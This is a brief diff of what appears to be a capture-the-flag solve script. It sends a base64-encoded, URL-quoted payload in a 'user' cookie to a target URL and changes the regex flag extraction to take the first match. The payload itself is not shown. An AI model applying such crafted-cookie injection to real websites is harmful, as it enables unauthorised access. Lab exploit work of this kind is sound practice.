@@ -25,5 +25,5 @@ print(payload)
 payload = quote(b64encode(payload))
 res = requests.get(url, headers={ 'Cookie': 'user='+payload })
 # print(res.text)
-flag = re.findall('SCIST{.+}', res.text)
+flag = re.findall('SCIST{.+}', res.text)[0]
 print(flag)
